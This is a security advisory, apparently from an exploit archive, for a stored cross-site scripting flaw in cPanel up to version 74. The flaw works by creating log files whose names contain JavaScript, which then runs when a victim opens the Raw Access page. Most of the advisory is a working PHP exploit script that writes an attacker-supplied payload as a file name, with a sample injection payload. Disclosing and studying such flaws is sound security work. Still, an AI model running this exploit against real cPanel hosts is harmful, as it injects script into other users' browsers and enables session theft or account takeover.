
[+] Author: Numan OZDEMIR

[+] Vendor Homepage: cpanel.com

[+] Version: Up to v74. Will be fixed in v76.

[+] Discovered by Numan OZDEMIR in InfinitumIT Labs

[+] root@numanozdemir.com - info@infinitumit.com.tr

[~] Description:

Attacker can inject JavaScript codes without cPanel privilege. Normally an attacker cant intervene to cPanel without cPanel privilege. But with this vulnerability, attacker can run JavaScript codes on cPanel user&#039;s browser while the victim surfing here:
http://ip:2082/cpsessXXXXXXXXXX/frontend/THEME/raw/index.html (Raw Access Page)
 
[~] How to Reproduce:
Create a file as named with your payload in /home/user/logs directory
or run the php exploit:

Note: You cant create a file as named with / (slash) character by this exploit.

This vulnerability is disclosed by cPanel Team&#039;s confirmation.

// for secure days...

<center>
<?php
$p = $_POST[&#039;payload&#039;];
$x = get_current_user();
$dir = "/home/".$x."/logs/";

if($_POST){
	if(touch($dir.$p)){
	die(&#039;
	Successfully exploited. Visit <br>
http://ip:2082/cpsessXXXXXXXXXX/frontend/THEME/raw/index.html	
	&#039;);
	}else{
		die(&#039;An error occured.&#039;);
	}
}else{
echo &#039;Enter your payload:
<form action="" method="post"><input type="text" name="payload" placeholder="<img src onerror=alert(2)>">
<input type="submit" value=">>"></form>&#039;;
}

// end of the script.
?>


